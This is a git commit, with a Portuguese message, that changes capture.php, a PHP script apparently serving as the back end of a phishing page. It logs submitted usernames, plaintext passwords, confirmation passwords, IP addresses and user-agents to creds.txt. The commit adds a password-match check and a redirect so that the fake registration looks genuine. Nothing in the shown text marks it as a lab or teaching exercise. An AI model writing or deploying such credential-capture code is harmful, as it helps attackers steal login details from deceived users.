0db9a7c6881c7a0ee983b8d99befd3a5e01956ad
Renan <rocha.renan06@gmail.com>
2024-09-04 17:21:36 -0300

    PHP = ValidarSenha+VerificarArquivo+Dados

--- capture.php
+++ capture.php
@@ -6,8 +6,19 @@ $ip = $_SERVER['REMOTE_ADDR'];
 $agent = $_SERVER['HTTP_USER_AGENT'];
 
 $file = 'creds.txt';
-$data = "Nome de Usuário: $username, Senha: $password, Confirmar Senha: $password2, IP: $ip, User-Agent: $agent\n";
 
+if ($password !== $password2) {
+    echo "As senhas não correspondem!<br>";
+    echo "Redirecionando...";
+    header("refresh:3;url=index.html");
+    exit();
+}
+
+if (!file_exists($file)) {
+    file_put_contents($file, "Registro de Credenciais\n", FILE_APPEND);
+}
+
+$data = "Nome de Usuário: $username, Senha: $password, Confirmar Senha: $password2, IP: $ip, User-Agent: $agent\n";
 file_put_contents($file, $data, FILE_APPEND);
 
 echo "Registro bem-sucedido!<br>";
